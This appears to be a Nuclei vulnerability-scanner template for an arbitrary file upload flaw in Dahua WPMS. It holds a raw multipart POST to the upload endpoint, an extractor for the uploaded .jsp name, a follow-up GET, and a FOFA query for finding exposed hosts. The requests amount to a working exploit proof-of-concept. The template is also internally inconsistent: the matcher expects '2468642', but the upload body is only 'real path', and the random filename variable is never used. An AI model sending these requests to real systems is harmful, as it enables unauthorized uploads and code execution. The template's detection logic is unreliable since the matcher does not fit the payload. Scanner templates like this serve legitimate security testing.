http:
- extractors:
  - group: 1
    internal: true
    name: uploadfile
    part: body
    regex:
    - VIDEO/(\d+\.jsp)
    type: regex
  matchers:
  - part: body
    type: word
    words:
    - '2468642'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /OAapp/jsp/upload.jsp HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5Ur8laykKAWws2QO

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15
    (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    Content-Length: 293


    ------WebKitFormBoundary5Ur8laykKAWws2QO

    Content-Disposition: form-data; name="file"; filename="Co5mos.xml"

    Content-Type: image/png


    real path

    ------WebKitFormBoundary5Ur8laykKAWws2QO

    Content-Disposition: form-data; name="filename"


    Co5mos.png

    ------WebKitFormBoundary5Ur8laykKAWws2QO--

    '
  - 'GET /publishingImg/VIDEO/{{uploadfile}} HTTP/1.1

    Host: {{Hostname}}

    '
id: dahua-wpms-publishing-fileupload
info:
  author: Co5mos
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
  description: Dahua WPMS Publishing arbitrary file upload vulnerability.
  metadata:
    fofa-query: "app=\"dahua-\u667A\u6167\u56ED\u533A\u7EFC\u5408\u7BA1\u7406\u5E73\
      \u53F0\""
    max-request: 2
  name: Dahua WPMS - Arbitrary File Upload
  severity: critical
  tags: dahua,fileupload
variables:
  filename: '{{rand_base(6)}}.jsp'
